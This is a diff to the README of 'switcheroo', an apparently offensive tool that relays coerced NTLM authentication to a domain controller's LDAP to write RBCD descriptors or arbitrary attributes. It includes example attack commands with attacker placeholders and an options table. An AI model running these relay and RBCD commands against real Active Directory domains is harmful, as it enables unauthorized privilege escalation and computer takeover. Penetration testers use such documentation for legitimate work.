@@ -35,15 +35,30 @@ To pick up newer master, `uv lock --upgrade && uv tool install --force --reinsta
 ```
 sudo switcheroo \
     'DOMAIN/attacker[:password]@DC.fqdn' \
-    -dc-ip <DC_IP> \
-    -base-dn 'DC=example,DC=com' \
-    -listen-ip <ATTACKER_IP> \
-    -victim 'DOMAIN/VICTIM$' \
-    -modify-dn 'CN=VICTIM,CN=Computers,DC=example,DC=com' \
-    -rbcd-sid '<ATTACKER_COMPUTER_SID>'
+    -rbcd 'ATTACKER_MACHINE$'
 ```
 
-Then coerce the victim toward `-listen-ip` from another terminal.
+`-rbcd` takes the account you want the RBCD descriptor to grant (its `objectSid` is
+looked up over LDAP) or a raw `S-1-5-...` SID — both verified at startup, before any
+coercion.
+
+`-base-dn` is optional: the search base comes from the DC's `rootDSE
+defaultNamingContext`. The modify target defaults to the relayed victim's own object, so both
+`-modify-dn` and `-modify-sam` are optional. `-listen-ip` defaults to `0.0.0.0`, i.e. all
+interfaces. Pass any of them to override, e.g. to write onto an object other than the
+coerced host — by DN or by `sAMAccountName` (resolved over LDAP):
+
+```
+sudo switcheroo \
+    'DOMAIN/attacker[:password]@DC.fqdn' \
+    -dc-ip <DC_IP> \
+    -listen-ip <ATTACKER_IP> \
+    -victim 'DOMAIN/VICTIM$' \
+    -modify-sam 'VICTIM$' \
+    -rbcd 'ATTACKER_MACHINE$'
+```
+
+Then coerce the victim toward one of your addresses from another terminal.
 
 Credentials follow Impacket's `[domain/]username[:password]@host`. Omit the password to
 be prompted, or use `-hashes LMHASH:NTHASH` / `-no-pass`.
@@ -69,10 +84,11 @@ tail -f /dev/null | sudo switcheroo ... &
 | Option | Meaning |
 |---|---|
 | `target` | `[domain/]username[:password]@<DC host/IP>` — attacker account + target DC |
-| `-dc-ip` / `-base-dn` / `-listen-ip` | DC IP, search base, attacker listener IP |
+| `-dc-ip` / `-listen-ip` | DC IP, attacker listener IP (default: `0.0.0.0`) |
+| `-base-dn` | search base (default: the DC's `defaultNamingContext`) |
 | `-victim DOMAIN/account` | only relay this victim |
-| `-modify-dn` | DN of the object to modify as the victim |
-| `-rbcd-sid SID` | write an RBCD descriptor granting this SID |
+| `-modify-dn DN` / `-modify-sam ACCOUNT` | object to modify as the victim, by DN or by sAMAccountName (default: the victim's own account) |
+| `-rbcd ACCOUNT\|SID` | write an RBCD descriptor granting this account (sAMAccountName, SID resolved via LDAP) or raw SID |
 | `-value` / `-value-hex` / `-attribute` | write an arbitrary attribute instead of RBCD |
 | `-ntlmrelayx PATH` | optional: run a specific `ntlmrelayx.py` instead of the installed one |
 | `-use-kerberos` / `-k` | Kerberos for the attacker's signed LDAP connections (TGT from password/hashes) instead of NTLM; the relayed victim auth is unaffected |
